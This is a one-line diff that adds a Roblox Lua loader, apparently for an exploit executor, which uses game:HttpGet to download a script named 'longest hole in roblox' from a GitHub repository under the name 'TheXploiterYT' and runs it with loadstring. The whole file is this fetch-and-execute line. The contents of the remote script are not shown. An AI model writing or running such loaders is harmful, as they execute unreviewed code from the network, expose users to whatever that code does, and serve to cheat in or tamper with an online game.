@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/TheXploiterYT/scripts/raw/main/longest%20hole%20in%20roblox",true))()
